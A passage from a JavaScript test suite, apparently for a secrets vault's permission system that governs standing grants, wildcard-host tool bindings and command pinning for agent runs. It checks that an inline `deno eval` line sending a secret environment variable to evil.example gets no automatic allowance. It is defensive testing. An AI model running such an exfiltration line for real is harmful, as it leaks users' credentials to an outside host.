  const y = q && q.askId && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const m = memberOf(w);
  ok(!!(y && y.ok && m && m.toolFor && m.toolFor['*.github.io'] === 'curl'), '⑥d the Allow writes the wildcard WITH its tool (toolFor) — the row the owner\'s Save would keep', { y, m });
  const c1 = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://pages.github.io/collect'));
  const c2 = await runAnswered(w, RUN(w.e.ref, 'wget', 'https://pages.github.io/collect'));
  ok(c1.r.ok && !c1.card && !!c2.card, '⑥e a wildcard with its tool admits ONLY that tool — curl runs with no card; wget to the same host draws its card', { c1: { ok: c1.r.ok, code: c1.r.code, card: !!c1.card }, c2: { card: !!c2.card, code: c2.r.code } });
  const pub = w.useGrants.publicFor(w.e.id);
  const save = w.useGrants.setRow(w.e.id, { to: (pub.to || []).map((x) => ({ kind: x.kind, key: x.key, name: x.name, hosts: x.hosts, ...(x.toolFor ? { toolFor: x.toolFor } : {}), source: x.source, at: x.at })), except: [] }, { reauthed: true });
  ok(!!(save && save.ok && (pub.to || []).length === 1 && (pub.to[0].toolFor || {})['*.github.io'] === 'curl'), '⑥f the row the Allow wrote is one the owner can Save again unchanged (the same rules judged both)', { save, to: pub.to });
  const ug = fs.readFileSync(path.join(REPO, 'src/server/vault-use-grants.js'), 'utf8'), dr = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
  const fnBody = (s, name) => { const i = s.indexOf(`function ${name}(`); return i < 0 ? '' : s.slice(i, s.indexOf('\n  }\n', i)); };
  const rs = dr.slice(Math.max(0, dr.indexOf('async function requestStanding(')));
  ok(['setRow', 'addMember', 'judgeMember'].every((f) => /rowRules\(/.test(fnBody(ug, f))) && !/GM\.validateWrite\(/.test(fnBody(ug, 'setRow') + fnBody(ug, 'addMember')) && rs.indexOf('useGrants.judgeMember(') > 0 && rs.indexOf('useGrants.judgeMember(') < rs.indexOf('userTodos.add('), '⑥g ONE validator: setRow, addMember and judgeMember read the same rowRules; the standing request asks judgeMember BEFORE it files its card');
});

console.log('⑦ (r2 MAJOR 2, probe P7) THE PIN GRAMMAR — a shape only where the hub pins what runs; a census over every row');
await leg('⑦ pin census', async () => {
  const names = [...VR.SHELLS, ...VR.INTERPRETERS];
  const G = VR.PIN_GRAMMAR || {};
  const missing = names.filter((n) => !G[n]);
  ok(names.length >= 30 && !missing.length, `⑦a every one of the ${names.length} SHELLS + INTERPRETERS rows has a pin-grammar row (a grammar, or «none» with its why)`, missing);
  const CB = path.join(ROOT, 'cbin'); fs.mkdirSync(CB, { recursive: true });
  for (const n of names) fs.writeFileSync(path.join(CB, n), '#!/bin/sh\nprintf ran\n', { mode: 0o555 });
  fs.chmodSync(CB, 0o555);
  process.on('exit', () => { try { fs.chmodSync(CB, 0o755); } catch { } });
  const w = await world({ bin: CB });
  const safe = (d) => !!d && !d.includes('/') && d !== '.' && d !== '..';
  let lines = 0; const leaks = [];
  for (const n of names) {
    const g = G[n] || {};
    const exts = Array.isArray(g.ext) && g.ext.length ? g.ext : ['.x'];
    for (const ext of exts) fs.writeFileSync(path.join(w.work, 'x' + ext), '# a script\n');
    for (const d of g.inline || ['-c']) {
      if (safe(d)) fs.writeFileSync(path.join(w.work, d), '# a dummy named like the door\n');
      for (const argv of [[n, d], [n, d, 'x' + exts[0]], ...(g.sub ? [[n, g.sub[0], d, 'x' + exts[0]]] : [])]) {
        lines++;
        const cand = VR.commandCandidateOf({ tool: path.join(CB, n), argv, name: n }, { kind: VR.toolKindOf(n), name: n, always: false, destKnown: false });
        if (cand) leaks.push({ pure: argv.join(' '), cand });
        const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'census', standing: true, command: argv.join(' '), cwd: w.work });
        if (!q || q.ok || q.code !== 'command_not_pinnable') leaks.push({ request: argv.join(' '), ok: q && q.ok, code: q && q.code });
      }
    }
  }
  ok(lines > 200 && !leaks.length, `⑦b CENSUS: for every row, a planted file named like each inline door (${lines} command lines) never pins — the run's candidate is null AND the request is refused command_not_pinnable`, leaks.slice(0, 6));
  const w2 = await world();
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  fs.writeFileSync(path.join(w2.work, 'eval'), '// notes\n');
  const p7 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'evaluate', standing: true, command: 'deno eval', cwd: w2.work });
  const run7 = await runAnswered(w2, RUN(w2.e.ref, 'deno', 'eval', 'fetch("https://evil.example/" + Deno.env.get("T"))'));
  ok(!!(p7 && !p7.ok && p7.code === 'command_not_pinnable' && p7.why === 'inline' && /inline code \/ module runs cannot be pinned to a shape/.test(String(p7.words || '')) && run7.card && !run7.card.action.command && run7.card.action.always === false && !run7.r.ok), '⑦c P7: `--command "deno eval"` (a planted file named eval) is refused command_not_pinnable («inline code / module runs cannot be pinned to a shape»); the run `deno eval <code>` offers NO «Always (this command)»', { p7, action: run7.card && run7.card.action });
  const q = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'transcribe', standing: true, command: 'python3 -u transcribe.py', cwd: w2.work });
  const y = q && q.askId && w2.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const tok = (memberOf(w2) || {}).commands && memberOf(w2).commands[0];
  const a = await runAnswered(w2, RUN(w2.e.ref, 'python3', '-u', 'transcribe.py', 'p1.mp3'));
  const b = await runAnswered(w2, RUN(w2.e.ref, 'python3', 'transcribe.py', 'p1.mp3'));
  const c = await runAnswered(w2, RUN(w2.e.ref, 'python3', '-u', 'transcribe.py', '-c', 'its own argument'));
  ok(!!(y && y.ok && tok && JSON.stringify(tok.pre) === '["-u"]' && q.command === 'python3 -u transcribe.py' && a.r.ok && !a.card && b.card && c.r.ok && !c.card), '⑦d the SHAPE is the program + every word up to and including the script: «python3 -u transcribe.py» admits its runs (what follows the script is its own arguments), «python3 transcribe.py» (another prefix) draws its card', { q, tok, a: !!a.card, b: !!b.card, c: { ok: c.r.ok, card: !!c.card } });
  const u = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'x', standing: true, command: 'mytool part01.mp3', cwd: w2.work });
  const ur = await runAnswered(w2, RUN(w2.e.ref, 'mytool', 'part01.mp3'));
  ok(!!(u && !u.ok && u.code === 'command_not_pinnable' && u.why === 'program' && ur.card && !ur.card.action.command), '⑦e a program outside both tables (it may run code its arguments name — a launcher, a build tool) has no command shape: the request is refused by name, its card offers no «Always (this command)»', { u, action: ur.card && ur.card.action });
  fs.writeFileSync(path.join(w2.work, 'main.ts'), 'console.log(1)\n');
  const dq = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'the deno job', standing: true, command: 'deno run -A main.ts', cwd: w2.work });
  ok(!!(dq && dq.ok && dq.command === 'deno run -A main.ts'), '⑦f `deno run -A main.ts` (the subcommand that runs a FILE, an option its row names) pins — filed with every word up to the script', dq);
});

console.log('⑧ (r2 MAJOR 3, probe P6) A STANDING MEMBER EXISTS ONLY WHERE THE OWNER CAN SEE AND ✕ IT');
await leg('⑧ seen and revoked', async () => {
  const w = await world();
  const mint = w.vault.agentMint(`agent:${CID}/tok`, { length: 32, forHost: 'api.x.example', actor: 'Transcriber' });
  const aid = `secrets:agent:${CID}/tok#secret`;
  const x = await runAnswered(w, ['--env', `T=${mint.ref}`, '--', 'python3', 'transcribe.py', 'a.mp3'], { answer: 'always', reauthed: true });
  const rowFor = (entry) => VI.rowOf('secrets', (w.sources.secrets().vaultRows() || []).find((r) => String(r.entry) === entry));
  const f = w.door.rowFacts(rowFor(`agent:${CID}/tok`));
  const chip = f && f.use && (f.use.to || [])[0];
  ok(!!(x.a && x.a.ok && f && f.own === true && f.use.own === true && chip && chip.source === 'card' && chip.id && chip.principal === `conversation:${CID}` && (chip.commands || []).length === 1), '⑧a P6: «Always (this command)» on the agent\'s OWN entry ⇒ the Vault window\'s row carries the member (its chip: source card, its command, the id + principal its ✕ posts)', { a: x.a, own: f && f.own, use: f && f.use && f.use.to });
  const rv = w.useGrants.revoke(aid, chip ? chip.principal : '');
  const again = await runAnswered(w, ['--env', `T=${mint.ref}`, '--', 'python3', 'transcribe.py', 'b.mp3']);
  ok(!!(rv && rv.ok && rv.removed && again.card), '⑧b its ✕ (POST /api/vault/use-grants/revoke — the store\'s revoke) takes it back: the next run draws its card again', { rv, card: !!again.card });
  const drawn = [];
  for (const [rid, cls, row] of [['mounts:m-1#password', 'storage', null], ['app-secrets:app-1#password', 'app-login', null], [w.e.id, 'secret', rowFor(w.e.name)], [aid, 'agent-entry', rowFor(`agent:${CID}/tok`)]]) {
    const add = w.useGrants.addMember(rid, { kind: 'conversation', key: CID, name: 'Transcriber' }, { hosts: ['api.tts.example'], source: 'card' });
    const ff = w.door.rowFacts(row || { id: rid, store: rid.split(':')[0], kind: 'password', label: cls, hosts: [] });
    drawn.push({ cls, add: !!(add && add.ok), drawn: !!(ff && ff.use && (ff.use.to || []).some((m) => m.principal === `conversation:${CID}` && m.id)) });
  }
  ok(drawn.every((d) => d.add && d.drawn), '⑧c CENSUS: a member the ONE writer writes on EVERY runnable entry class (storage, app-login, secret, agent-entry) is drawn by the window\'s reader (rowFacts → its chip + ✕)', drawn);
  const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(path.join(d, e.name)) : e.name.endsWith('.js') ? [path.join(d, e.name)] : []));
  const direct = walk(path.join(REPO, 'src')).filter((p) => !p.endsWith('vault-use-grants.js') && /\.(?:set|remove)\(\s*(?:'vault-use'|U\.DOOR|VUG\.DOOR)\b/.test(fs.readFileSync(p, 'utf8'))).map((p) => path.relative(REPO, p));
  const win = fs.readFileSync(path.join(REPO, 'src/lib/vault-window.js'), 'utf8'), ux = fs.readFileSync(path.join(REPO, 'src/lib/vault-use-row.js'), 'utf8'), dr = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
  ok(!direct.length && /if \(row\.run && row\.run\.use\) \{ const ux = useExtras\(/.test(win) && /'vw-ak-x vw-use-x'/.test(ux) && /useB\.hidden = !!\(u && u\.own\)/.test(ux) && /if \(VR\.agentScopeOf\(ref\)\) \{ const use = ownUseOf\(row, ref\);/.test(dr), '⑧d grep: no file but the ONE writer (vault-use-grants.js) writes a vault-use row; the window draws every row whose facts carry `use` — no class left out — each member with its ✕; an own entry hides only «Who may use it…»', direct);
});

console.log('⑨ (r2 JUDGE 4, probe P2 — r4: re-derived on per-scope ends) A STANDING WRITE BESIDE A TIMED SCOPE NEVER TOUCHES IT — its own scope is added, the other keeps ITS OWN end');
await leg('⑨ timed kept', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const until = Date.now() + 30 * 86400e3;
  w.useGrants.addMember(w.e.id, { kind: 'conversation', key: CID, name: 'Transcriber' }, { hosts: ['api.tts.example'], until, source: 'card' });
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'transcribe', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  const card = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  ok(!!(card && card.facts && Array.isArray(card.facts.changes) && !card.facts.changes.length && !card.facts.replaces && !/replaces that grant|This replaces/.test(card.detail)), '⑨a P2 (request road, r4): the standing card beside a 30-day HOST grant names NO replacement — its own scope (the command) is not held, so nothing of this conversation ends (no line, no facts)', card && { facts: card.facts, detail: card.detail });
  const model = card && FA.runCardOf(card, {});
  ok(!!(model && model.rows.some((r) => r.key === 'until' && !r.warn && !JSON.stringify(r.lines).includes('replaces'))), '⑨b … its «until» row is plain (nothing marked to replace)', model && model.rows);
  const y = q && q.askId && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const m = memberOf(w);
  const cmd = m && m.scopes.find((s) => s.kind === 'command');
  const tts = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://api.tts.example/v1'));
  ok(!!(y && y.ok && m && endOfScope(m, 'api.tts.example') === until && cmd && cmd.until === null && tts.r.ok && !tts.card), '⑨c … its Allow ADDS the command (no end) and api.tts.example keeps ITS OWN 30 days — never made permanent, never lost (a curl to it runs by grant, no card)', { m, card: !!tts.card, r: tts.r && tts.r.code });
  const w2 = await world();
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  w2.useGrants.addMember(w2.e.id, { kind: 'conversation', key: CID, name: 'Transcriber' }, { hosts: ['api.tts.example'], until, source: 'card' });
  const r = await runAnswered(w2, RUN(w2.e.ref, 'python3', 'other.py', 's.mp3'), { answer: 'always', reauthed: true });
  const ca = r.card && r.card.facts && r.card.facts.always && r.card.facts.always.command;
  const hint = r.card && (FA.runCardOf(r.card, {}) || { always: {} }).always.hint;
  const m2 = memberOf(w2);
  ok(!!(ca && !(ca.changes || []).length && !ca.replaces && !JSON.stringify(hint || '').includes('replaces') && r.a && r.a.ok && m2 && endOfScope(m2, 'api.tts.example') === until && (m2.commands || []).length === 1), '⑨d P2 (card road, r4): «Always (this command)» beside a 30-day host grant says nothing replaces, and its press adds the command — the host keeps its 30 days', { ca, hint, m2 });
});

console.log('⑩ (r2 MINOR 5, probe P5) a closed entry\'s standing card says the Allow turns its switch on');
await leg('⑩ switch said', async () => {
  const w = await world();
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'call the API', standing: true, hosts: ['api.tts.example'], cwd: w.work });
  const card = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  const w2 = await world();
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  const q2 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'call the API', standing: true, hosts: ['api.tts.example'], cwd: w2.work });
  const card2 = openOf(w2, 'vault-grant-ask').find((i) => q2 && i.action.askId === q2.askId);
  const model = card && FA.runCardOf(card, {});
  ok(!!(card && card.facts && card.facts.switchOn === true && card.detail.includes('Allow also turns on «Usable by agent runs» for this entry') && model && model.rows.some((r) => r.key === 'switch' && r.warn) && card2 && card2.facts && card2.facts.switchOn === false && !card2.detail.includes('Allow also turns on')), '⑩ P5: a CLOSED entry\'s standing card says the Allow turns «Usable by agent runs» on (for this conversation — a marked row); an open entry\'s card does not', { f1: card && card.facts, f2: card2 && card2.facts });
});

console.log('⑪ (r2 MINOR 6, probe P4) a Deny quiets the (conversation, entry) pair for EVERY ask kind and scope');
await leg('⑪ quiet', async () => {
  const w = await world();
  const p = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'one run' });
  p && p.askId && w.door.answerRequest(p.askId, { answer: 'deny' });
  const st = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, hosts: ['api.tts.example'], cwd: w.work });
  const w2 = await world();
  const s1 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'x', standing: true, hosts: ['api.tts.example'], cwd: w2.work });
  s1 && s1.askId && w2.door.answerRequest(s1.askId, { answer: 'deny' });
  const s2 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'x', standing: true, hosts: ['api.tts.example', 'b.tts.example'], cwd: w2.work });
  const s3 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'x' });
  const s4 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'x', standing: true, command: 'python3 transcribe.py', cwd: w2.work });
  ok(!!(st && st.code === 'request_quiet' && s2 && s2.code === 'request_quiet' && s3 && s3.code === 'request_quiet' && s4 && s4.code === 'request_quiet' && !openOf(w2, 'vault-grant-ask').length), '⑪a P4: a standing ask right after a PLAIN Deny, one more host after a standing Deny, a plain ask, another scope — every one request_quiet, no card', [st, s2, s3, s4].map((x) => x && (x.code || 'FILED')));
  for (const k of [...(w2.door._reqQuiet || new Map()).keys()]) w2.door._reqQuiet.set(k, Date.now() - 1);   // the quiet is over
  const s5 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'x', standing: true, hosts: ['api.tts.example', 'b.tts.example'], cwd: w2.work });
  const s6 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'x', standing: true, hosts: ['api.tts.example', 'b.tts.example'], cwd: w2.work });
  ok(!!(s5 && s5.ok && s6 && s6.code === 'request_pending' && openOf(w2, 'vault-grant-ask').length === 1), '⑪b after the quiet: ONE card, with the latest scope (the same ask again is request_pending, as today)', { s5, s6 });
});

console.log('⑫ (r2 below the cut) a TIMED cover is said as timed; `uses` carries the STORED grant');
await leg('⑫ timed + stored', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const until = Date.now() + 8 * 3600e3;
  w.useGrants.addMember(w.e.id, { kind: 'conversation', key: CID, name: 'Transcriber' }, { hosts: ['api.tts.example'], until, source: 'card' });
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, hosts: ['api.tts.example'], cwd: w.work });
  ok(!!(q && q.ok && q.already === 'timed' && q.until === new Date(until).toISOString() && /^vg-[0-9a-f]{8}$/.test(String(q.grant))), '⑫a P3: a standing request a TIME-LIMITED (8 h) member already covers answers `already: \'timed\'` + its end — never «standing»', q);
  const w2 = await world();
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  const q2 = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'transcribe', standing: true, command: 'python3 transcribe.py', cwd: w2.work });
  q2 && q2.askId && w2.door.answerRequest(q2.askId, { answer: 'standing', reauthed: true });
  await runAnswered(w2, RUN(w2.e.ref, 'python3', 'transcribe.py', 'u1.mp3'));
  const gid = ((w2.useGrants.publicFor(w2.e.id) || {}).to || [])[0];
  const uses = (w2.door.usesFor(w2.caller()) || {}).uses || [];
  const line = useLines(w2).filter((l) => l.door === 'run' && l.outcome === 'ok').pop();
  const cli = fs.readFileSync(path.join(REPO, 'data/bin/vibespace-vault'), 'utf8');
  ok(!!(gid && uses.length && uses[0].grant === gid.id && line && line.grant === gid.id && /\$\{u\.grant \? `  by grant · standing \$\{u\.grant\}` : ''\}/.test(cli)), '⑫b `uses` returns the use line\'s STORED grant field (read back from the audit file) — what the CLI prints «by grant · standing» from', { grant: gid && gid.id, uses: uses.slice(0, 2), line: line && line.grant });
});

console.log('⑬ (r2 VISUAL — 主开发\'s read of the shots) the standing card = label rows + ONE fold; a vault reference is never a link');
await leg('⑬ the card', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'transcribe 40 segments', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  const card = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  const v = card && FA.runCardOf(card, {});
  const face = v ? JSON.stringify(v.rows) + v.headline : '';
  const foldRef = v && v.fold.some((f) => f.lines.some((l) => l.some((x) => x.code === w.e.ref)));
  ok(!!(v && v.rows.map((r) => r.key).join() === 'secret,purpose,command,program,until' && v.rows[0].lines[0][0].text === 'TTS API key' && !face.includes('vault://') && foldRef && v.fold.some((f) => f.label === 'How it ends') && v.cmd === ''), '⑬a the standing card is the run card\'s shape: label rows (密钥 = the NAME, 用途, 命令, 运行 = the program, 期限), the vault:// reference only under 技术细节 — as code — with how it ends; no command box', v && { rows: v.rows.map((r) => r.key), fold: v.fold.map((f) => f.label) });
  const FL = await import(path.join(REPO, 'src/lib/foryou-links.js'));
  const segs = FL.segmentText(card.detail);
  const linked = segs.filter((g) => g.t === 'link' && /vault:|:\/\/|secrets\//.test(g.s));
  const s2 = FL.segmentText(`Secret: K — ${w.e.ref} · \`${w.e.ref}\``);
  ok(!linked.length && !s2.some((g) => g.t === 'link') && segs.map((g) => g.s).join('') === card.detail, '⑬b a vault reference is NEVER a link (the phone linkified «://secrets/secret:…» out of one): the segmenter keeps it text, in prose and in a code span', linked);
});

console.log('⑭ (r3 MAJOR 1, legacy-wild + legacy-wild-e2e) A LEGACY WILDCARD IS A MIGRATION FACT — never a refusal for another member');
await leg('⑭ legacy wildcard', async () => {
  const A = { kind: 'conversation', key: 'cid-A', name: 'A' }, B = { kind: 'conversation', key: 'cid-B', name: 'B' };
  const w = await world();
  plantLegacy(w, [{ key: 'cid-A', name: 'A', hosts: ['*.amazonaws.com'] }]);   // what the 2.369.363/.364 carry wrote
  const vA = (w.useGrants.publicFor(w.e.id).to || []).find((m) => m.key === 'cid-A');
  ok(!!(vA && !vA.toolFor && (vA.hosts || []).join() === '*.amazonaws.com'), '⑭a (the setup) the shipped carry\'s member: conversation A × *.amazonaws.com with NO tool — it verifies (the reader keeps it)', vA);
  const b = w.useGrants.addMember(w.e.id, B, { hosts: ['api.example.com'], source: 'card' });
  const j = w.useGrants.judgeMember(w.e.id, { kind: 'conversation', key: 'cid-C', name: 'C' }, { hosts: ['api.other.example'], source: 'request', standing: true });
  const aw = w.useGrants.addMember(w.e.id, A, { hosts: ['api.a.example'], source: 'card' });
  const mA2 = memberOf(w, 'cid-A');
  const nb = w.useGrants.addMember(w.e.id, B, { hosts: ['*.github.io'], source: 'card' });
  ok(!!(b && b.ok && j && j.ok && aw && aw.ok && mA2 && (mA2.hosts || []).includes('*.amazonaws.com') && !((mA2.toolFor || {})['*.amazonaws.com']) && nb && !nb.ok && nb.code === 'tool_required' && nb.host === '*.github.io'), '⑭b legacy-wild: the rules judge THIS write — B\'s member is added, C\'s standing member is judged ok, A\'s own widening keeps its legacy wildcard as it was; a NEW wildcard with no tool is still refused tool_required, naming ITS host', { b, j, aw, nb });
  const pub = w.useGrants.publicFor(w.e.id);
  const save = w.useGrants.setRow(w.e.id, { to: (pub.to || []).map((x) => ({ kind: x.kind, key: x.key, name: x.name, hosts: x.hosts, ...(x.toolFor ? { toolFor: x.toolFor } : {}), source: x.source, at: x.at })), except: [] }, { reauthed: true });
  ok(!!(save && save.ok), '⑭c the owner\'s Save of that row as it stands goes through (the legacy member kept as it was is not the Save\'s to refuse)', save);
  const w2 = await world();
  plantLegacy(w2, [{ key: 'cid-A', name: 'A', hosts: ['*.amazonaws.com'] }, { key: 'cid-Z', name: 'Z', hosts: ['*.legacy.example'] }]);
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });   // the unlock's first read: the carries run
  const wa = memberOf(w2, 'cid-A'), wz = memberOf(w2, 'cid-Z');
  ok(!!(wa && (wa.toolFor || {})['*.amazonaws.com'] === 'aws' && wz && !wz.toolFor), '⑭d THE WILDCARD CARRY at unlock: A\'s *.amazonaws.com now names aws (the CLI the tool table names for it); *.legacy.example, which no row names, stays as it was', { wa, wz });
  const rb = await runAnswered(w2, RUN(w2.e.ref, 'python3', 'other.py', 'seg1'), { caller: w2.caller('cid-B', 'B'), answer: 'always', reauthed: true });
  const qc = await w2.door.request({ caller: w2.caller('cid-C', 'C'), entry: w2.e.ref, purpose: 'probe', standing: true, hosts: ['api.example.com'], cwd: w2.work });
  ok(!!(rb.card && rb.card.action.command && rb.a && rb.a.ok && rb.r.ok && qc && qc.ok && qc.askId), '⑭e legacy-wild-e2e: B\'s «Always (this command)» on that entry is written and its run goes through; C\'s `request --standing --host api.example.com` is judged on ITS member only — its card is filed', { a: rb.a, r: { ok: rb.r.ok, code: rb.r.code }, qc });
  const pub2 = w2.useGrants.publicFor(w2.e.id);
  const z = (pub2.to || []).find((m) => m.key === 'cid-Z'), a = (pub2.to || []).find((m) => m.key === 'cid-A');
  const notes = () => (w2.userTodos.snapshot().open || []).filter((i) => /An older «Always» lets any program reach a wildcard host/.test(i.text));
  const n1 = notes();
  w2.vault.lock('test'); await w2.vault.unlock(PW); w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  ok(!!(z && JSON.stringify(z.legacy) === '["*.legacy.example"]' && a && Array.isArray(a.legacy) && !a.legacy.length && n1.length === 1 && n1[0].kind === 'notice' && n1[0].detail.includes('*.legacy.example') && notes().length === 1), '⑭f the legacy member is NAMED on its row (publicFor `legacy` — its chip: «legacy wildcard: any tool») and the owner is told ONCE (one For-you notice naming the host; a relock + unlock files no second)', { z: z && z.legacy, notes: n1.map((i) => i.detail) });
  const w3 = await world();
  const keyOf = (hosts) => 'v9:' + JSON.stringify([null, null, [], [], hosts]);
  const c = w3.useGrants.carry([{ conv: 'cid-L', key: keyOf(['*.legacy.example']), entries: [w3.e.id], until: null }, { conv: 'cid-M', key: keyOf(['*.amazonaws.com']), entries: [w3.e.id], until: null }], { toolOfWild: VR.wildcardToolOf });
  const mL = memberOf(w3, 'cid-L'), mM = memberOf(w3, 'cid-M');
  ok(!!(c && c.carried === 2 && c.failed === 0 && mL && !mL.toolFor && mM && (mM.toolFor || {})['*.amazonaws.com'] === 'aws'), '⑭g the carry of an «always» row not carried yet: a wildcard whose CLI the key does not say gets the one the tool table names (aws); one nobody can name is CARRIED as a legacy member — never dropped', { c, mL, mM });
});

console.log('⑮ (r3 MAJOR 2, expired-revived — r4: re-derived) AN ENDED SCOPE IS NEVER REVIVED — it stays as history; only a write that NAMES it grants it anew, and its card says so');
await leg('⑮ never revived', async () => {
  const X = { kind: 'conversation', key: CID, name: 'Transcriber' };
  const w = await world(), w3 = await world(), w4 = await world(), w6 = await world();   // r5: the four ended-scope worlds planted at once — ONE wait for their ends
  for (const x of [w, w3, w6]) x.door.setRunnable({ id: x.e.id, on: true, reauthed: true });
  w.useGrants.addMember(w.e.id, X, { hosts: ['old.example'], until: Date.now() + 60, source: 'owner' });
  w3.useGrants.addMember(w3.e.id, X, { hosts: ['old.example'], until: Date.now() + 60, source: 'owner' });
  w4.useGrants.addMember(w4.e.id, X, { hosts: ['old.example'], until: Date.now() + 60, source: 'card' });
  w4.useGrants.addMember(w4.e.id, { kind: 'conversation', key: 'cid-live', name: 'L' }, { hosts: ['a.example'], until: Date.now() + 8 * 3600e3, source: 'card' });
  w6.useGrants.addMember(w6.e.id, X, { hosts: ['old.example', 'keep.example'], until: Date.now() + 60, source: 'card' });
  await sleep(120);
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'probe', standing: true, command: 'python3 other.py', cwd: w.work });
  const card = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  ok(!!(card && card.facts && Array.isArray(card.facts.changes) && !card.facts.changes.length && !/replaces|ended/.test(card.detail)), '⑮a expired-revived (r4): a standing card for a COMMAND beside an ENDED host scope (old.example) names nothing — the write does not touch old.example', card && { facts: card.facts, detail: card.detail });
  const y = q && q.askId && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const m = memberOf(w);
  const v = w.useGrants.verdictFor(w.e.id, { conversationKeys: [CID], groupIds: [] }, { hosts: ['old.example'], destinationKnown: true });
  const c = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://old.example/x'));
  ok(!!(y && y.ok && m && endOfScope(m, 'old.example') <= Date.now() && (m.commands || []).length === 1 && m.scopes.find((s) => s.kind === 'command').until === null && v && !v.ok && c.card), '⑮b … its Allow adds ONLY the command (no end): old.example stays ENDED on the row (history, never revived) — a curl to it draws its card', { m, v });
  const r = await runAnswered(w3, RUN(w3.e.ref, 'python3', 'other.py', 's.mp3'), { answer: 'always', reauthed: true });
  const ca = r.card && r.card.facts && r.card.facts.always && r.card.facts.always.command;
  const m3 = memberOf(w3);
  ok(!!(ca && !(ca.changes || []).length && r.a && r.a.ok && m3 && endOfScope(m3, 'old.example') <= Date.now() && (m3.commands || []).length === 1), '⑮c the card road: «Always (this command)» beside an ENDED host scope names nothing and adds only the command — old.example stays ended', { ca, m3 });
  const later = Date.now() + 30 * 86400e3, aEnd = endOfScope(memberOf(w4, 'cid-live'), 'a.example');
  w4.useGrants.addMember(w4.e.id, X, { hosts: ['new.example'], until: Date.now() + 8 * 3600e3, source: 'card' });
  w4.useGrants.addMember(w4.e.id, { kind: 'conversation', key: 'cid-live', name: 'L' }, { hosts: ['b.example'], until: later, source: 'card' });
  const mx = memberOf(w4), ml = memberOf(w4, 'cid-live');
  ok(!!(mx && endOfScope(mx, 'old.example') <= Date.now() && endOfScope(mx, 'new.example') > Date.now() && ml && endOfScope(ml, 'a.example') === aEnd && endOfScope(ml, 'b.example') === later), '⑮d EVERY writer (r4): a write onto a member touches only the scopes it names — the ENDED old.example stays ended beside the new new.example; a LIVE a.example keeps its 8 hours beside b.example\'s 30 days (never ∪ under one end, never replaced)', { mx, ml });
  const w5 = await world();
  w5.door.setRunnable({ id: w5.e.id, on: true, reauthed: true });
  w5.useGrants.addMember(w5.e.id, X, { hosts: ['api.tts.example'], source: 'owner' });
  const q5 = await w5.door.request({ caller: w5.caller(), entry: w5.e.ref, purpose: 'transcribe', standing: true, command: 'python3 transcribe.py', cwd: w5.work });
  const card5 = openOf(w5, 'vault-grant-ask').find((i) => q5 && i.action.askId === q5.askId);
  const y5 = q5 && q5.askId && w5.door.answerRequest(q5.askId, { answer: 'standing', reauthed: true });
  const m5 = memberOf(w5);
  ok(!!(card5 && card5.facts && !(card5.facts.changes || []).length && !card5.facts.replaces && !/This replaces|replaces that grant/.test(card5.detail) && y5 && y5.ok && m5 && (m5.hosts || []).join() === 'api.tts.example' && (m5.commands || []).length === 1 && !m5.until), '⑮e the card says it replaces ONLY when it replaces: beside a member with NO end there is nothing to replace — no line, and the Allow adds the command to it', { facts: card5 && card5.facts, m5 });
  const r6 = await runAnswered(w6, RUN(w6.e.ref, 'curl', 'https://old.example/x'), { answer: 'always', reauthed: true });
  const ch6 = r6.card && r6.card.facts && r6.card.facts.always && r6.card.facts.always.changes;
  const hint6 = changeRowOf(r6.drawn);   // r5: the card's OWN row of what it writes (the hint beside a hosts «Always» is hidden)
  const m6 = memberOf(w6);
